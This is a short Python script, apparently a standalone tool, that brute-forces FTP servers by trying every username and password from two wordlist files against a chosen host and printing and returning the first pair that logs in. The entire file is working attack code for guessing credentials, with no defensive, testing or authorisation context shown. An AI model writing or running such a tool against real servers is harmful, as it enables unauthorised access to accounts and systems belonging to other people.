import ftplib

def brute_force_ftp(hostname, username_file, password_file):
    # Read the list of usernames from the file
    with open(username_file, "r") as f:
        usernames = [line.strip() for line in f.readlines()]

    # Read the list of passwords from the file
    with open(password_file, "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    # Attempt to login with each combination of username and password
    for username in usernames:
        for password in passwords:
            try:
                # Create an FTP object and login with the username and password
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)

                # If the login was successful, print a message and return the username and password
                print(f"Login successful: {username}:{password}")
                return username, password

            except:
                # If the login failed, continue to the next combination of username and password
                pass

    # If none of the combinations of username and password worked, print a message and return None
    print("Login failed.")
    return None